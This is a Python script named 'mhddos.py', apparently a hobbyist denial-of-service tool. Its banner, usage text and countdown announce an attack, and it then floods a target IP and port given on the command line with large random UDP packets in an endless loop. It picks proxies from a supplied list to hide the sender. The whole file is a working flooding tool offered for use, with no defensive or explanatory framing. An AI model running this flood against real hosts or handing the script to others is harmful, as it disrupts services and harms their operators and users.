import sys
import socks
import socket
import random
from time import sleep

def print_slow(txt):
    for x in txt:                     # cycle through the text one character at a time
        print(x, end='', flush=True)  # print one character, no new line, flush buffer
        sleep(0.04)
    print() # go to new line
print('''
\033c
\033[91m +--------------------------------------------+
\033[92m         ┏━┓┏━┓ ┏┓ ┏┓ ┏━━━┓ ┏━━━┓ ┏━━━┓
\033[92m         ┃┃┗┛┃┃ ┃┃ ┃┃ ┗┓┏┓┃ ┃┏━┓┃ ┃┏━┓┃
\033[92m         ┃┏┓┏┓┃ ┃┗━┛┃  ┃┃┃┃ ┃┃ ┃┃ ┃┗━━┓
\033[92m         ┃┃┃┃┃┃ ┃┏━┓┃  ┃┃┃┃ ┃┃ ┃┃ ┗━━┓┃
\033[92m         ┃┃┃┃┃┃ ┃┃ ┃┃ ┏┛┗┛┃ ┃┗━┛┃ ┃┗━┛┃
\033[92m         ┗┛┗┛┗┛ ┗┛ ┗┛ ┗━━━┛ ┗━━━┛ ┗━━━┛    
\033[91m +--------------------------------------------+''')
print_slow('\033[94m      Coded By MH_ProDev, Anti-Hack')
print('''\033[91m +--------------------------------------------+\033[97m''')
print('usge: ./mhddos.py [ip] [port] [proxylist] [socket]')
print('./mhddos.py 127.0.0.1 80 proxy.txt 8000')

time = 3
print(f"\033[94mAttack Starting On {time}s")
sleep(1)
time = time - 1
print(f"\033[94mAttack Starting On {time}s")
sleep(1)
time = time - 1
print(f"\033[94mAttack Starting On {time}s")
sleep(1)
time = 0
print(f"\033[94mAttack Starting On {time}s")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
sock.settimeout(0.01)
fileobj = sock.makefile('rb', 0)
randoms = 1
port = 1
proxylist = sys.argv[3]
with open(proxylist, "r") as f:
    lines = f.readlines()
def main():
    global randoms
    global port
    global sockets
    sockets = 0
    while True:
        try:
            if sockets == int(sys.argv[4]):
                print("Attack Stopped")
                exit()
            sockets = sockets + 1
            proxy = random.choice(lines)
            socks.set_default_proxy(socks.SOCKS5, str(proxy.rstrip("\n\r")))
            if randoms != 65535:
                randoms = 1
            randoms = port + 1
            if sys.argv[2] == "random" or sys.argv[2] == "r":
                port = int(randoms)
            else:
                port = int(sys.argv[2])
            sock.sendto(random._urandom(65500),(str(sys.argv[1]),int(port)))
            print(' \033[92m',randoms,"| \033[97m[\033[92m!\033[97m] \033[97mPacket Sended By\033[96m", str(proxy.rstrip("\n\r")))
        except socket.error:
            sock.sendto(random._urandom(65500),(str(sys.argv[1]),int(port)))
        except socket.timeout:
            sock.sendto(random._urandom(65500),(str(sys.argv[1]),int(port)))
        except KeyboardInterrupt:
            exit()
    return main()
if __name__ == '__main__':
    main()
